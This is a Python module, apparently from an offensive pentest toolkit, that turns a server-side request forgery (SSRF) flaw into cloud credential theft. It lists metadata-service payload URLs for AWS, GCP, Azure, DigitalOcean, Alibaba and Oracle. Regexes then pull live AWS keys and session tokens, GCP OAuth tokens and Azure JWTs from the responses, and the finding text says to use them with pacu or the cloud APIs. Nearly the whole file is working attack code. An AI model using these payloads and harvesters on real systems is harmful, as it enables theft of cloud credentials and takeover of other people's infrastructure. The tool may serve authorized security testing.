"""Generalized SSRF -> cloud IMDS credential extraction.

If a target has *any* SSRF primitive (arbitrary URL fetched server-side), the same
handful of well-known cloud metadata endpoints yield instance credentials on the
major providers - one class, one detector, one wiring.

* AWS IMDSv1 + IMDSv2 (v2 needs a token PUT; we emit both).
* GCP metadata (needs the Metadata-Flavor header).
* Azure IMDS (needs Metadata:true).
* DigitalOcean, Alibaba, Oracle Cloud - included for completeness.

Pure functions: `imds_probe_urls` for the SSRF payloads to try, `parse_imds`
extracts credentials from the response body if one lands.
"""

from __future__ import annotations

import json
import re

from ..core.state import Credential, Finding, Severity


def imds_probes() -> list[tuple[str, str]]:
    """(cloud, URL-or-request) pairs to feed into an SSRF sink one at a time."""
    return [
        ("aws-imdsv1", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("aws-imdsv2-token",
         "PUT http://169.254.169.254/latest/api/token "
         "H:X-aws-ec2-metadata-token-ttl-seconds:21600  # then use the token"),
        ("aws-imdsv2-fetch",
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/  "
         "H:X-aws-ec2-metadata-token:<TOKEN>"),
        ("gcp",
         "http://metadata.google.internal/computeMetadata/v1/instance/"
         "service-accounts/default/token  H:Metadata-Flavor:Google"),
        ("azure",
         "http://169.254.169.254/metadata/identity/oauth2/token?"
         "api-version=2018-02-01&resource=https://management.azure.com/  "
         "H:Metadata:true"),
        ("digitalocean",
         "http://169.254.169.254/metadata/v1/user-data"),
        ("alibaba",
         "http://100.100.100.200/latest/meta-data/ram/security-credentials/"),
        ("oracle",
         "http://169.254.169.254/opc/v2/instance/  H:Authorization:Bearer\\ Oracle"),
    ]


_AWS_CREDS_RE = re.compile(
    r'"AccessKeyId"\s*:\s*"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})".*?'
    r'"SecretAccessKey"\s*:\s*"([A-Za-z0-9/+]{40})".*?'
    r'"Token"\s*:\s*"([^"]+)"', re.S)
_GCP_TOKEN_RE = re.compile(r'"access_token"\s*:\s*"(ya29\.[A-Za-z0-9._\-]+)"')
_AZURE_TOKEN_RE = re.compile(r'"access_token"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.'
                             r'[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"')


def parse_imds(response: str, host: str | None = None) -> tuple[list[Finding], list[Credential]]:
    """Extract cloud creds from an IMDS response body, whichever provider."""
    findings: list[Finding] = []
    creds: list[Credential] = []
    text = response or ""

    m = _AWS_CREDS_RE.search(text)
    if m:
        access, secret, token = m.groups()
        findings.append(Finding(
            title="AWS instance credentials via SSRF/IMDS",
            severity=Severity.CRITICAL, host=host,
            description="An SSRF or IMDS-reachable endpoint returned live AWS "
                        "STS credentials for the instance profile. Set them in "
                        "the environment and enumerate IAM with `aws sts "
                        "get-caller-identity` / pacu.",
            evidence=f"AccessKeyId={access}  Token=<{len(token)} chars>",
            validation="confirmed", proof="AWS AccessKeyId + SecretAccessKey + Token"))
        for k, v in (("AWS_ACCESS_KEY_ID", access), ("AWS_SECRET_ACCESS_KEY", secret),
                     ("AWS_SESSION_TOKEN", token)):
            creds.append(Credential(username=k, secret=v, kind="token",
                                    source="SSRF/IMDS (AWS)", validated=True))

    m = _GCP_TOKEN_RE.search(text)
    if m:
        findings.append(Finding(
            title="GCP service-account access token via SSRF/IMDS",
            severity=Severity.CRITICAL, host=host,
            description="GCP metadata returned a live OAuth2 access token for "
                        "the instance's service account. Use with the GCP REST "
                        "API (Authorization: Bearer).",
            evidence=f"access_token=ya29...({len(m.group(1))} chars)",
            validation="confirmed", proof="GCP ya29 token"))
        creds.append(Credential(username="gcp-metadata", secret=m.group(1),
                                kind="token", source="SSRF/IMDS (GCP)",
                                validated=True))

    m = _AZURE_TOKEN_RE.search(text)
    if m:
        findings.append(Finding(
            title="Azure managed-identity token via SSRF/IMDS",
            severity=Severity.CRITICAL, host=host,
            description="Azure IMDS returned an OAuth2 access token for the "
                        "instance's managed identity. Use it against ARM / other "
                        "Azure APIs.",
            evidence=f"access_token=eyJ...({len(m.group(1))} chars)",
            validation="confirmed", proof="Azure JWT"))
        creds.append(Credential(username="azure-imds", secret=m.group(1),
                                kind="token", source="SSRF/IMDS (Azure)",
                                validated=True))

    # DigitalOcean / other: user-data can leak secrets (regex-scanned by
    # secretscan when wired in). If it looks like a JSON blob, note it.
    if not findings and text.strip().startswith(("{", "[")):
        try:
            json.loads(text)
            findings.append(Finding(
                title="IMDS-shaped JSON via SSRF (inspect for secrets)",
                severity=Severity.MEDIUM, host=host,
                description="The SSRF returned a JSON metadata document; run it "
                            "through secretscan or inspect manually for creds.",
                evidence=text[:300]))
        except json.JSONDecodeError:
            pass
    return findings, creds
